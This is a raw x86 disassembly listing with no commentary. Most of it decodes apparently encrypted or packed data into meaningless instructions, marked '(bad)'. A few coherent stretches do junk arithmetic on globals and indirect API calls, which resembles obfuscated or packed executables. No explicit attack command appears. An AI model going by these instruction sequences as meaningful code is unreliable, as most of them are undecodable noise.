  408dcb:	cmp    al,0x3a
  408dcd:	sbb    DWORD PTR [eax-0x277aae1c],ebx
  408dd3:	mov    ah,0x1b
  408dd5:	push   es
  408dd6:	ins    BYTE PTR es:[edi],dx
  408dd7:	call   esi
  408dd9:	das    
  408dda:	mov    al,0x56
  408ddc:	out    0xb6,eax
  408dde:	ret    
  408ddf:	mov    esi,0xe8a7bba
  408de4:	imul   esp,DWORD PTR [edx],0xffffff9c
  408de7:	mov    esi,0x47653de3
  408dec:	push   es
  408ded:	mov    esp,0x53013ce7
  408df2:	enter  0x3af1,0x65
  408df6:	mov    BYTE PTR [ebx-0xe],bh
  408df9:	xchg   esi,eax
  408dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dfb:	(bad)  
  408dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dfd:	sti    
  408dfe:	aaa    
  408dff:	in     eax,0xc4
  408e01:	cmp    BYTE PTR [edx+0x16b30b9e],dh
  408e07:	bound  edi,QWORD PTR [esi]
  408e09:	sub    eax,0x66352ba7
  408e0e:	xchg   BYTE PTR [ebp-0x117582f3],bh
  408e14:	mov    esp,0x86f7e603
  408e19:	pop    ebx
  408e1a:	je     0x408e88
  408e1c:	jl     0x408e99
  408e1e:	call   0x553e:0x6521d3fc
  408e25:	arpl   WORD PTR [eax+ecx*2+0x532814cf],si
  408e2c:	stos   DWORD PTR es:[edi],eax
  408e2d:	(bad)  
  408e2e:	fadd   DWORD PTR [ebp+0x7f0f2fdb]
  408e34:	stos   BYTE PTR es:[edi],al
  408e35:	imul   ebx,DWORD PTR [eax],0xd60c682e
  408e3b:	mov    BYTE PTR [ebx+ebx*4-0x78],bl
  408e3f:	hlt    
  408e40:	inc    eax
  408e41:	(bad)  
  408e42:	(bad)  
  408e43:	mul    BYTE PTR [edx]
  408e45:	xor    ecx,0x77d93c9
  408e4b:	jne    0x408e2f
  408e4d:	test   DWORD PTR [ebp-0x2725c25e],0x225440dd
  408e57:	mov    BYTE PTR ds:0x9cb21af5,al
  408e5d:	jnp    0x408e28
  408e5f:	retf   0x9c04
  408e62:	cwde   
  408e63:	mov    dl,0x9f
  408e65:	dec    edi
  408e66:	pop    edi
  408e67:	or     ch,BYTE PTR [esi]
  408e69:	cwde   
  408e6a:	xchg   DWORD PTR [eax+0x71],ebp
  408e6d:	pusha  
  408e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e6f:	push   edi
  408e70:	out    0xd5,al
  408e72:	mov    eax,0x8a325f9e
  408e78:	(bad)  
  408e79:	xlat   BYTE PTR ds:[ebx]
  408e7a:	leave  
  408e7b:	test   BYTE PTR [edi+0x19],al
  408e7e:	cmp    al,0x83
  408e80:	in     al,dx
  408e81:	xor    bh,al
  408e83:	inc    ebp
  408e84:	call   0xcbba43ff
  408e89:	mov    eax,0x9c2b8ae8
  408e8e:	neg    ecx
  408e90:	mov    DWORD PTR [ebp-0x14],eax
  408e93:	adc    DWORD PTR ds:0x428469,0x14e
  408e9d:	jmp    0x40911c
  408ea2:	outs   dx,DWORD PTR ds:[esi]
  408ea3:	in     eax,0x49
  408ea5:	rcr    BYTE PTR [esp+esi*2+0x7b],1
  408ea9:	retw   
  408eab:	dec    ebx
  408eac:	jo     0x408e8b
  408eae:	pop    edx
  408eaf:	pop    ss
  408eb0:	dec    eax
  408eb1:	xchg   edx,eax
  408eb2:	jp     0x408f31
  408eb4:	mov    esi,0xbec279be
  408eb9:	mov    esi,0xdae20de7
  408ebe:	sub    bh,BYTE PTR [edx]
  408ec0:	sub    BYTE PTR [edx+0x3386f43e],0xb9
  408ec7:	add    dl,BYTE PTR [edx-0x162c5ab0]
  408ecd:	cmp    al,al
  408ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ed0:	fisub  WORD PTR [edx+0x11a6c486]
  408ed6:	sti    
  408ed7:	mov    cl,ah
  408ed9:	movzx  edi,BYTE PTR ds:0x72c46ca
  408ee0:	or     cl,0xfc
  408ee3:	aas    
  408ee4:	lds    esi,FWORD PTR [ebx-0x7af82f36]
  408eea:	cmc    
  408eeb:	or     dh,ch
  408eed:	lods   al,BYTE PTR ds:[esi]
  408eee:	push   ds
  408eef:	sbb    al,0x67
  408ef1:	call   edi
  408ef3:	fwait
  408ef4:	add    edi,DWORD PTR [esi+0x3328a007]
  408efa:	sub    al,0xec
  408efc:	bound  ebx,QWORD PTR [esi-0x7b]
  408eff:	lahf   
  408f00:	mov    esp,0x2740ad36
  408f05:	push   0xfc4cfa51
  408f0a:	pop    edx
  408f0b:	sti    
  408f0c:	push   esp
  408f0d:	hlt    
  408f0e:	ja     0x408f89
  408f10:	push   0x24
  408f12:	out    0x8,eax
  408f14:	stos   DWORD PTR es:[edi],eax
  408f15:	push   eax
  408f16:	jg     0x408f52
  408f18:	and    bl,BYTE PTR [ecx+0x67]
  408f1b:	mov    edi,0xc70c6568
  408f20:	push   edx
  408f21:	add    DWORD PTR [ecx*8-0xbbdbbe8],ebp
  408f28:	test   ebx,esi
  408f2a:	outs   dx,DWORD PTR ds:[esi]
  408f2b:	inc    ebp
  408f2c:	mov    edi,0xedb7986d
  408f31:	xchg   ebx,eax
  408f32:	shl    dl,0xfa
  408f35:	bound  ebp,QWORD PTR [ebx*2-0x55a73e07]
  408f3c:	jb     0x408ee8
  408f3e:	scas   al,BYTE PTR es:[edi]
  408f3f:	cmp    al,0x92
  408f41:	mov    dh,0xed
  408f43:	push   ds
  408f44:	mov    dl,0x70
  408f46:	pop    ds
  408f47:	adc    BYTE PTR [ecx+0xa],dh
  408f4a:	mov    al,0x22
  408f4c:	test   eax,0xaf6a5682
  408f51:	in     al,0xac
  408f53:	setne  BYTE PTR [esi-0x5c]
  408f57:	mov    ch,0xa1
  408f59:	jne    0x408f23
  408f5b:	jecxz  0x408f08
  408f5d:	add    edi,DWORD PTR [ecx+0x67]
  408f60:	pop    ds
  408f61:	nop
  408f62:	mov    ebx,DWORD PTR [esi-0x6a7d55f4]
  408f68:	ret    0x865
  408f6b:	sbb    al,0xf
  408f6d:	or     BYTE PTR [ecx+0x0],dh
  408f70:	jmp    0x792b:0x2e1fc8ca
  408f77:	lods   eax,DWORD PTR ds:[esi]
  408f78:	daa    
  408f79:	popa   
  408f7a:	and    edi,DWORD PTR [ebx+0x51fd1768]
  408f80:	out    dx,al
  408f81:	out    0xe9,eax
  408f83:	dec    ebx
  408f84:	fdiv   QWORD PTR [esi+0x4b266b14]
  408f8a:	retf   0x21d5
  408f8d:	out    0x36,al
  408f8f:	out    0x9c,eax
  408f91:	addr16 dec esi
  408f93:	(bad)  
  408f94:	xchg   edx,eax
  408f95:	or     eax,0x7beebae0
  408f9a:	mov    ecx,0x2aeb88ad
  408f9f:	push   ss
  408fa0:	leave  
  408fa1:	(bad)  
  408fa2:	push   eax
  408fa3:	cmp    bl,dl
  408fa5:	das    
  408fa6:	(bad)
  408fa9:	sbb    BYTE PTR [edx+0x4d1108c1],dl
  408faf:	sbb    DWORD PTR [edi-0x69759fd4],edi
  408fb5:	sbb    eax,0xad908596
  408fba:	repz stc 
  408fbc:	push   0x31df3207
  408fc1:	mov    ?,WORD PTR [ebx-0x36f6358]
  408fc7:	les    edx,FWORD PTR [edi+0x3f25de63]
  408fcd:	pushf  
  408fce:	mov    edi,0xca6e8fcd
  408fd3:	inc    edi
  408fd4:	pop    ss
  408fd5:	hlt    
  408fd6:	cdq    
  408fd7:	jno    0x408f7c
  408fd9:	xchg   cl,dh
  408fdb:	mov    ebx,0x844fd9bb
  408fe0:	cld    
  408fe1:	pop    edx
  408fe2:	(bad)  
  408fe3:	cwde   
  408fe4:	mov    eax,0x19f1b91
  408fe9:	mov    eax,ds:0x13ea414d
  408fee:	call   0xc9cd9847
  408ff3:	mov    dl,0x56
  408ff5:	and    al,0x86
  408ff7:	icebp  
  408ff8:	jae    0x408fc8
  408ffa:	inc    edx
  408ffb:	popf   
  408ffc:	rcr    ebx,1
  408ffe:	push   esi
  408fff:	retf   
  409000:	dec    edi
  409001:	hlt    
  409002:	call   0xa2d472df
  409007:	sbb    BYTE PTR [eax],0x9c
  40900a:	iret   
  40900b:	pop    edi
  40900c:	imul   edi,DWORD PTR [edx+0x43],0xf6d8e232
  409013:	dec    esi
  409014:	ja     0x408fb4
  409016:	int3   
  409017:	jmp    0x1a4905f4
  40901c:	(bad)  
  40901d:	fimul  DWORD PTR [ebp+0x6c1537fa]
  409023:	mov    bh,0xb3
  409025:	and    eax,DWORD PTR [ebx-0xf]
  409028:	jb     0x409076
  40902a:	and    DWORD PTR [edx],esp
  40902c:	rol    al,cl
  40902e:	imul   esi,DWORD PTR [ebx-0x27],0xce359699
  409035:	lods   al,BYTE PTR ds:[esi]
  409036:	jg     0x408fbf
  409038:	cs dec esi
  40903a:	dec    esp
  40903b:	jno    0x409086
  40903d:	fisttp QWORD PTR [ebp-0x68]
  409040:	push   0xffffff8f
  409042:	mov    ch,0x9c
  409044:	outs   dx,BYTE PTR ds:[esi]
  409045:	fldcw  WORD PTR [ebx]
  409047:	data16 xor dl,BYTE PTR [edx-0x74]
  40904b:	stc    
  40904c:	dec    esp
  40904d:	and    eax,0xb8cece4f
  409052:	out    dx,eax
  409053:	mov    al,0xb4
  409055:	xchg   edi,eax
  409056:	js     0x40902b
  409058:	mov    ecx,DWORD PTR [ecx+0x118bce14]
  40905e:	mov    ebx,gs
  409060:	jp     0x409026
  409062:	iret   
  409063:	pusha  
  409064:	dec    ebp
  409065:	clc    
  409066:	in     al,0xfe
  409068:	and    eax,0xb255b922
  40906d:	add    eax,0xc43459a
  409072:	loopne 0x40907c
  409074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409075:	(bad)  
  409076:	ss mov bh,0x21
  409079:	push   ss
  40907a:	xor    BYTE PTR [ebx+eiz*2+0x60b74aca],ch
  409081:	sbb    bl,ah
  409083:	xchg   edx,eax
  409084:	mov    ch,0x5d
  409086:	int3   
  409087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409088:	retf   0x1f2
  40908b:	push   es
  40908c:	fistp  QWORD PTR [ebx+0x26]
  40908f:	dec    ecx
  409090:	daa    
  409091:	xadd   DWORD PTR [esi-0x52],eax
  409095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409096:	dec    esp
  409097:	out    dx,al
  409098:	leave  
  409099:	outs   dx,DWORD PTR ds:[esi]
  40909a:	xor    BYTE PTR [edi+0x2d],0xca
  40909e:	inc    eax
  40909f:	inc    esi
  4090a0:	stos   DWORD PTR es:[edi],eax
  4090a1:	sbb    al,0x7c
  4090a3:	pop    edx
  4090a4:	dec    eax
  4090a5:	icebp  
  4090a6:	call   0x3628beca
  4090ab:	xchg   edi,eax
  4090ac:	lods   eax,DWORD PTR ds:[esi]
  4090ad:	aaa    
  4090ae:	add    dl,BYTE PTR [eax+ecx*1+0xae3ab5a]
  4090b5:	or     eax,0x506c0f87
  4090ba:	mov    eax,edi
  4090bc:	std    
  4090bd:	and    DWORD PTR [ecx],ebp
  4090bf:	push   ebx
  4090c0:	fbstp  TBYTE PTR ss:0xe8fc147f
  4090c7:	dec    edi
  4090c8:	lahf   
  4090c9:	xchg   ebp,eax
  4090ca:	jg     0x4090bc
  4090cc:	stos   DWORD PTR es:[edi],eax
  4090cd:	fld    QWORD PTR [edx-0x2e]
  4090d0:	and    BYTE PTR [edx-0x609c8c67],0x40
  4090d7:	xchg   DWORD PTR [ebx+edx*8+0xc6d97fe],ebp
  4090de:	ins    DWORD PTR es:[edi],dx
  4090df:	fs push ecx
  4090e1:	add    eax,0xaed6266c
  4090e6:	(bad)  
  4090e7:	out    dx,al
  4090e8:	popf   
  4090e9:	adc    BYTE PTR [ebx],ch
  4090eb:	(bad)
  4090ee:	mov    WORD PTR [ecx],?
  4090f0:	push   0x44407067
  4090f5:	iret   
  4090f6:	dec    ecx
  4090f7:	push   es
  4090f8:	xor    cl,0x7a
  4090fb:	mov    dl,0x45
  4090fd:	in     eax,dx
  4090fe:	and    dl,BYTE PTR [edx+eax*4]
  409101:	cmp    eax,0x4ab676
  409106:	outs   dx,BYTE PTR ds:[esi]
  409107:	test   esp,ecx
  409109:	mov    ch,dl
  40910b:	sahf   
  40910c:	cld    
  40910d:	and    bh,BYTE PTR [ecx+ebp*2]
  409110:	les    edx,FWORD PTR [ebx-0x19]
  409113:	pop    ebp
  409114:	daa    
  409115:	cmp    eax,0xbcb450d0
  40911a:	push   edx
  40911b:	dec    esp
  40911c:	mov    DWORD PTR [ebp-0x30],0xcb79b572
  409123:	mov    DWORD PTR [ebp-0x2c],eax
  409126:	cmp    DWORD PTR ds:0x428591,0x0
  40912d:	mov    DWORD PTR ds:0x42858d,0x24a6
  409137:	mov    DWORD PTR ds:0x428441,0x40da
  409141:	jmp    0x4091a4
  409146:	not    eax
  409148:	mov    DWORD PTR ds:0x4284e5,0x7db9
  409152:	cmp    DWORD PTR ds:0x428591,0x0
  409159:	jae    0x409182
  40915f:	push   0x1999
  409164:	push   0x428167
  409169:	push   0x428313
  40916e:	call   DWORD PTR ds:0x42e0c8
  409174:	sub    ecx,DWORD PTR ds:0x428389
  40917a:	and    ecx,ecx
  40917c:	adc    DWORD PTR ds:0x428429,ebx
  409182:	mov    ecx,DWORD PTR ds:0x428491
  409188:	add    DWORD PTR ds:0x428361,ecx
  40918e:	neg    DWORD PTR ds:0x428355
  409194:	xor    DWORD PTR ds:0x428515,ebx
  40919a:	or     DWORD PTR ds:0x428449,0x673
  4091a4:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  4091ab:	mov    DWORD PTR [ebp-0x24],0x29bd2
  4091b2:	mov    DWORD PTR [ebp-0x20],0x6ec3
  4091b9:	sbb    eax,ecx
  4091bb:	push   esi
  4091bc:	mov    DWORD PTR [ebp-0x1c],0x2a74
  4091c3:	xor    ecx,ecx
  4091c5:	xor    ecx,DWORD PTR ds:0x4283d9
  4091cb:	mov    eax,ds:0x42854d
  4091d0:	sub    ecx,eax
  4091d2:	or     ecx,DWORD PTR [ecx+eax*1]
  4091d5:	mov    DWORD PTR [ebp-0x10],0x2e2c
  4091dc:	push   0x5285
  4091e1:	or     DWORD PTR ds:0x428361,ecx
  4091e7:	mov    DWORD PTR [ebp-0xc],0x3d0a
  4091ee:	and    ecx,ecx
  4091f0:	mov    eax,DWORD PTR [ebp-0x10]
  4091f3:	and    ecx,DWORD PTR ds:0x428511
  4091f9:	mov    ecx,DWORD PTR [ebp-0xc]
  4091fc:	sub    DWORD PTR ds:0x428511,0x428599
  409206:	push   0x712c
  40920b:	or     DWORD PTR ds:0x42851d,0x428439
  409215:	push   ecx
  409216:	sbb    DWORD PTR ds:0x42850d,0x3312
  409220:	push   eax
  409221:	call   0x41594e
  409226:	and    DWORD PTR ds:0x42850d,edi
  40922c:	mov    ecx,DWORD PTR [ebp-0x20]
  40922f:	mov    esi,DWORD PTR [ebp-0x1c]
  409232:	and    DWORD PTR ds:0x428519,0x428431
  40923c:	push   0x5f43
  409241:	and    DWORD PTR ds:0x428461,0x42857d
  40924b:	or     edx,0x69b4
  409251:	push   0x1657
  409256:	or     eax,0x528b
  40925b:	xor    edx,esi
  40925d:	xor    eax,ecx
  40925f:	xor    DWORD PTR ds:0x428445,0x4284e9
  409269:	push   edx
  40926a:	push   eax
  40926b:	or     DWORD PTR ds:0x428389,0x42c0
  409275:	call   0x41594e
  40927a:	mov    esi,DWORD PTR ds:0x42844d
  409280:	xor    esi,DWORD PTR ds:0x428485
  409286:	mov    DWORD PTR ds:0x42844d,esi
  40928c:	mov    ecx,DWORD PTR [ebp-0x28]
  40928f:	and    esi,DWORD PTR ds:0x428589
  409295:	jmp    0x409514
  40929a:	aam    0x9e
  40929c:	jp     0x409286
  40929e:	mov    esp,0xba543b
  4092a3:	ret    0x923c
  4092a6:	dec    ebp
  4092a7:	sbb    al,BYTE PTR [edi+ecx*8-0x41417ccb]
  4092ae:	jns    0x409272
  4092b0:	mov    esi,0xcd09d5be
  4092b5:	shr    DWORD PTR [edi+0x24627893],0x1a
  4092bc:	and    ah,bl
  4092be:	push   ds
  4092bf:	(bad)  
  4092c0:	sbb    al,BYTE PTR [ebx-0xc0c8f6b]
  4092c6:	(bad)
  4092c9:	mov    WORD PTR [edx+ebx*8+0x18],cs
  4092cd:	sub    dl,BYTE PTR [edi-0x3706bb4e]
  4092d3:	loop   0x409338
  4092d5:	es call 0x3074d0df
  4092db:	sbb    BYTE PTR [ecx],bh
  4092dd:	fsubr  st(2),st
  4092df:	and    esi,DWORD PTR [edx+ebx*1+0x5]
  4092e3:	stos   BYTE PTR es:[edi],al
  4092e4:	sbb    BYTE PTR [edx-0x311b0031],0x7e
  4092eb:	sbb    eax,0x3aca5958
  4092f0:	mov    al,ds:0x83878774
  4092f5:	and    ch,BYTE PTR [eax]
  4092f7:	dec    edi
  4092f8:	sub    eax,0x65f7cc96
  4092fd:	mov    bl,0xbc
  4092ff:	sub    eax,esi
  409301:	ror    DWORD PTR [ebx],0xe2
  409304:	(bad)  
  409305:	repnz cmp DWORD PTR [eax+ebx*1-0x41e55178],eax
  40930d:	popa   
  40930e:	enter  0x201,0xae
  409312:	jmp    DWORD PTR [edx+0x5c]
  409315:	out    dx,eax
  409316:	in     al,0xa2
  409318:	sbb    bl,BYTE PTR [esi-0x48929379]
  40931e:	inc    esp
  40931f:	sbb    edi,DWORD PTR [edx+ebp*1+0x6b045267]
  409326:	frstor [ebx-0x5818e6a0]
  40932c:	mov    dl,0x79
  40932e:	test   DWORD PTR [ebx],edi
  409330:	adc    BYTE PTR [edi],ah
  409332:	ror    bh,0x10
  409335:	mov    ebp,0xd8be5db6
  40933a:	mov    eax,ds:0x37d073be
  40933f:	loope  0x4092c8
  409341:	(bad)  
  409342:	or     al,0x24
  409344:	sahf   
  409345:	idiv   DWORD PTR [esi+0x4]
  409348:	fild   DWORD PTR [ebx]
  40934a:	cwde   
  40934b:	cs icebp 
  40934d:	lods   eax,DWORD PTR ds:[esi]
  40934e:	jne    0x4092f7
  409350:	inc    eax
  409351:	test   al,0x42
  409353:	fbstp  TBYTE PTR [eax-0x1c]
  409356:	ds xchg ecx,eax
  409358:	lock leave 
  40935a:	stos   BYTE PTR es:[edi],al
  40935b:	cmp    dh,BYTE PTR [edx-0x7e23959e]
  409361:	cs mov eax,0x38031ab2
  409367:	add    ecx,edi
  409369:	pop    edi
  40936a:	fsub   st,st(6)
  40936c:	pusha  
  40936d:	push   0xffffffa4
  40936f:	lods   al,BYTE PTR ds:[esi]
  409370:	pop    eax
  409371:	(bad)
  409375:	jmp    0x409381
  409377:	dec    esi
  409378:	xchg   ecx,eax
  409379:	lods   al,BYTE PTR ds:[esi]
  40937a:	ret    0xace9
  40937d:	or     BYTE PTR [ecx],dl
  40937f:	js     0x409308
  409381:	ja     0x409307
  409383:	mov    ds:0x94bb3756,eax
  409388:	mov    cl,0xf4
  40938a:	in     eax,dx
  40938b:	add    BYTE PTR [ecx+0x40],0xc1
  40938f:	or     eax,0x723bbd17
  409394:	sbb    DWORD PTR [ecx-0x2f],ebx
  409397:	mov    DWORD PTR [esi+0x3a1c8cd0],esi
  40939d:	dec    esi
  40939e:	jmp    0xc7908034
  4093a3:	push   eax
  4093a4:	lahf   
  4093a5:	mov    ds:0x5f8d1307,al
  4093aa:	bound  esp,QWORD PTR [eax-0x475f086c]
  4093b0:	out    dx,eax
  4093b1:	dec    ebx
  4093b2:	mov    bh,0x2a
  4093b4:	xlat   BYTE PTR ds:[ebx]
  4093b5:	add    DWORD PTR [eax+0x17be86d6],edi
  4093bb:	sbb    BYTE PTR cs:[edx-0x3ed9a116],bh
  4093c2:	cs inc ebx
  4093c4:	and    BYTE PTR [edi],al
  4093c6:	add    bl,BYTE PTR [eax+0x346f1793]
  4093cc:	sbb    esi,edi
  4093ce:	pop    eax
  4093cf:	outs   dx,BYTE PTR ds:[si]
  4093d1:	shl    BYTE PTR [esi-0x5ac64000],cl
  4093d7:	mov    ds:0x1924aa61,al
  4093dc:	xor    DWORD PTR [esi],esp
  4093de:	fwait
  4093df:	popf   
  4093e0:	pushf  
  4093e1:	or     dh,cl
  4093e3:	dec    ecx
  4093e4:	cld    
  4093e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093e6:	das    
  4093e7:	mov    gs,ebp
  4093e9:	mov    edx,0xbccc4c0e
  4093ee:	pop    esi
  4093ef:	xchg   esi,eax
  4093f0:	iret   
  4093f1:	leave  
  4093f2:	inc    ecx
  4093f3:	xor    edi,DWORD PTR fs:[ebx+0x40bfe6a2]
  4093fa:	mov    dh,0x5b
  4093fc:	into   
  4093fd:	xor    al,0xe7
  4093ff:	outs   dx,DWORD PTR ds:[esi]
  409400:	sbb    DWORD PTR [ebx],edx
  409402:	lods   eax,DWORD PTR ds:[esi]
  409403:	popa   
  409404:	lahf   
  409405:	mov    dx,0xe8ad
  409409:	pop    ecx
  40940a:	test   DWORD PTR [esi],edx
  40940c:	loopne 0x40942e
  40940e:	ins    BYTE PTR es:[edi],dx
  40940f:	mov    cl,0xcb
  409411:	sub    BYTE PTR [ecx],al
  409413:	jno    0x4093e4
  409415:	inc    ecx
  409416:	ss popf 
  409418:	mov    bh,BYTE PTR [esi-0x682028c4]
  40941e:	lods   eax,DWORD PTR ds:[esi]
  40941f:	inc    edx
  409420:	into   
  409421:	add    DWORD PTR [edx+0x4d],edx
  409424:	push   edx
  409425:	aad    0xa8
  409427:	shl    dl,0xdc
  40942a:	xchg   esi,eax
  40942b:	cmp    eax,0xdf6608f4
  409430:	sub    eax,DWORD PTR [esi+ecx*2-0x41]
  409434:	scas   al,BYTE PTR es:[edi]
  409435:	les    ecx,FWORD PTR [edx]
  409437:	push   ecx
  409438:	loop   0x4094a7
  40943a:	dec    eax
  40943b:	or     BYTE PTR [eax+ecx*2+0x5],dl
  40943f:	pop    edi
  409440:	inc    edx
  409441:	ins    BYTE PTR es:[edi],dx
  409442:	addr16 es cmp al,0xd5
  409446:	mov    al,ds:0x2561d446
  40944b:	scas   eax,DWORD PTR es:[edi]
  40944c:	js     0x409455
  40944e:	mov    edx,0x4a6b5634
  409453:	ds xchg edx,eax
  409455:	loope  0x409454
  409457:	popf   
  409458:	sbb    bl,0x8d
  40945b:	xor    eax,0x2023c265
  409460:	das    
  409461:	push   ecx
  409462:	in     al,0x19
  409464:	test   eax,0x9e62ba8a
  409469:	or     eax,0x2f448fe9
  40946e:	lock pop ebx
  409470:	adc    bl,dh
  409472:	stc    
  409473:	pop    ecx
  409474:	push   ss
  409475:	mov    BYTE PTR [edx+0x59],bl
  409478:	fcmovne st,st(4)
  40947a:	mov    ds:0x8f251e95,eax
  40947f:	sub    dl,cl
  409481:	shr    DWORD PTR [esi],cl
  409483:	cmp    al,0x8b
  409485:	addr16 das 
  409487:	add    al,BYTE PTR [eax+0x6fb00e3c]
  40948d:	add    ah,dh
  40948f:	hlt    
  409490:	sub    bl,cl
  409492:	mov    cl,0x79
  409494:	dec    edi
  409495:	inc    ebp
  409496:	xchg   BYTE PTR [ecx-0x4d58efde],bl
  40949c:	xchg   esp,eax
  40949d:	xor    eax,0xed7bee7e
  4094a2:	or     al,0x4b
  4094a4:	jne    0x4094cd
  4094a6:	mov    ebp,0xc61bd9e2
  4094ab:	xchg   ebp,eax
  4094ac:	lods   eax,DWORD PTR ds:[esi]
  4094ad:	ds dec eax
  4094af:	stc    
  4094b0:	cmp    al,0xa9
  4094b2:	rcr    DWORD PTR [edx+0x8],cl
  4094b5:	ror    BYTE PTR [ecx+edi*4+0xe7e87b0],0x78
  4094bd:	mov    cl,0x96
  4094bf:	popa   
  4094c0:	aas    
  4094c1:	stos   BYTE PTR es:[edi],al
  4094c2:	rcl    eax,1
  4094c4:	icebp  
  4094c5:	sbb    edi,DWORD PTR [esi+eiz*8-0x13]
  4094c9:	jge    0x409509
  4094cb:	ret    0xcd9
  4094ce:	ret    0xec80
  4094d1:	sub    eax,0xf8cd30c1
  4094d6:	mov    bh,0x8d
  4094d8:	xor    esi,DWORD PTR [esi]
  4094da:	jge    0x409519
  4094dc:	push   edi
  4094dd:	leave  
  4094de:	xor    bl,BYTE PTR [ecx-0x36871446]
  4094e4:	inc    esi
  4094e5:	mov    bh,0x5
  4094e7:	sbb    al,BYTE PTR [esi]
  4094e9:	aas    
  4094ea:	scas   eax,DWORD PTR es:[edi]
  4094eb:	mov    dl,0xb1
  4094ed:	retf   
  4094ee:	aad    0x75
  4094f0:	jns    0x40951f
  4094f2:	sti    
  4094f3:	inc    ebp
  4094f4:	mov    bl,0x93
  4094f6:	push   esi
  4094f7:	pop    ss
  4094f8:	xchg   edx,eax
  4094f9:	inc    ebx
  4094fa:	dec    eax
  4094fb:	imul   BYTE PTR [esi+edi*8-0xbfc1a70]
  409502:	mov    dh,0xd9
  409504:	call   0xf14e:0xda68937c
  40950b:	jae    0x4094f9
  40950d:	(bad)  
  40950e:	pushf  
  40950f:	mov    BYTE PTR [esi-0xc],cl
  409512:	ret    
  409513:	loopne 0x4094a0
  409515:	jne    0x4094f3
  409517:	adc    DWORD PTR ds:0x42836d,0x61cb
  409521:	push   esi
  409522:	dec    DWORD PTR ds:0x428361
  409528:	push   ecx
  409529:	not    DWORD PTR ds:0x428571
  40952f:	push   edx
  409530:	adc    DWORD PTR ds:0x428471,0x42848d
  40953a:	push   eax
  40953b:	sbb    DWORD PTR ds:0x428365,0x42836d
  409545:	call   0x4222a7
  40954a:	mov    DWORD PTR [ebp-0x30],eax
  40954d:	cmp    DWORD PTR ds:0x428459,0x0
  409554:	mov    ecx,0x19e0
  409559:	mov    DWORD PTR ds:0x428569,0x71a7
  409563:	mov    ecx,0x1714
  409568:	jmp    0x4095c4
  40956d:	movzx  eax,BYTE PTR ds:0x428455
  409574:	mov    eax,0x70fc
  409579:	cmp    DWORD PTR ds:0x428459,0x0
  409580:	jb     0x4095ac
  409586:	push   0x428471
  40958b:	push   0x428313
  409590:	call   DWORD PTR ds:0x42e24c
  409596:	and    DWORD PTR ds:0x42857d,0x600c
  4095a0:	add    ecx,DWORD PTR ds:0x42846d
  4095a6:	or     ecx,DWORD PTR ds:0x428485
  4095ac:	adc    ecx,esi
  4095ae:	sbb    DWORD PTR ds:0x42850d,edx
  4095b4:	sbb    DWORD PTR ds:0x428461,0x1a7e
  4095be:	add    esi,0x6267
  4095c4:	mov    DWORD PTR [ebp-0x2c],edx
  4095c7:	mov    DWORD PTR [ebp-0x10],0x5fa8
  4095ce:	mov    DWORD PTR [ebp-0xc],0x1751
  4095d5:	or     DWORD PTR ds:0x428485,0x4285a1
  4095df:	mov    DWORD PTR [ebp-0x20],0x5e90
  4095e6:	sub    DWORD PTR ds:0x428435,ecx
  4095ec:	mov    DWORD PTR [ebp-0x1c],0xfc1
  4095f3:	mov    edx,DWORD PTR ds:0x428409
  4095f9:	mov    edx,DWORD PTR [edx]
  4095fb:	adc    DWORD PTR ds:0x42837d,edx
  409601:	mov    DWORD PTR [ebp-0x28],0x7044
  409608:	or     DWORD PTR ds:0x42844d,0x3ffc
  409612:	mov    DWORD PTR [ebp-0x24],0x7bf
  409619:	mov    eax,DWORD PTR [ebp-0x28]
  40961c:	adc    ecx,0x6b26
  409622:	mov    ecx,DWORD PTR [ebp-0x24]
  409625:	add    DWORD PTR ds:0x428591,edi
  40962b:	mov    edx,DWORD PTR [ebp-0x20]
  40962e:	cmp    DWORD PTR ds:0x428455,0x0
  409635:	mov    DWORD PTR ds:0x42845d,edi
  40963b:	mov    DWORD PTR ds:0x428425,ecx
  409641:	mov    DWORD PTR ds:0x428465,0x2db2
  40964b:	jmp    0x409715
  409650:	mov    esi,DWORD PTR ds:0x428461
  409656:	mov    DWORD PTR ds:0x4284f9,ebx
  40965c:	cmp    DWORD PTR ds:0x428455,0x0
  409663:	jg     0x409686
  409669:	push   0x3d0d
  40966e:	call   DWORD PTR ds:0x42e000
  409674:	xor    DWORD PTR ds:0x428459,ecx
  40967a:	sbb    DWORD PTR ds:0x428455,edi
  409680:	dec    DWORD PTR ds:0x428369
  409686:	mov    esi,DWORD PTR ds:0x428355
  40968c:	xor    DWORD PTR ds:0x4284fd,esi
  409692:	and    DWORD PTR ds:0x428505,ecx
  409698:	dec    esi
  409699:	cmp    DWORD PTR ds:0x428509,0x0
  4096a0:	mov    DWORD PTR ds:0x428511,0x1a91
  4096aa:	movzx  esi,BYTE PTR ds:0x428361
  4096b1:	mov    esi,0x63fe
  4096b6:	jmp    0x409715
  4096bb:	mov    DWORD PTR ds:0x42844d,0x20e7
  4096c5:	cmp    DWORD PTR ds:0x428509,0x0
  4096cc:	jae    0x4096f5
  4096d2:	push   DWORD PTR [ebp-0x20]
  4096d5:	push   0x278f
  4096da:	push   DWORD PTR [ebp-0x1c]
  4096dd:	call   DWORD PTR ds:0x42e004
  4096e3:	or     esi,DWORD PTR ds:0x4284f1
  4096e9:	sbb    esi,DWORD PTR ds:0x4284e5
  4096ef:	and    DWORD PTR ds:0x42834d,edx
  4096f5:	dec    DWORD PTR ds:0x428589
  4096fb:	or     esi,0x67c0
  409701:	add    DWORD PTR ds:0x428435,0x146d
  40970b:	sbb    DWORD PTR ds:0x428585,0xdcf
  409715:	mov    esi,DWORD PTR [ebp-0x1c]
  409718:	add    eax,0x355c
  40971d:	mov    DWORD PTR ds:0x42838d,0x28d
  409727:	adc    ecx,0x819
  40972d:	xor    DWORD PTR ds:0x428351,0x49ee
  409737:	or     eax,edx
  409739:	mov    DWORD PTR ds:0x428385,0x383a
  409743:	mov    edx,DWORD PTR [ebp-0x10]
  409746:	or     ecx,esi
  409748:	sub    DWORD PTR ds:0x428379,0x6778
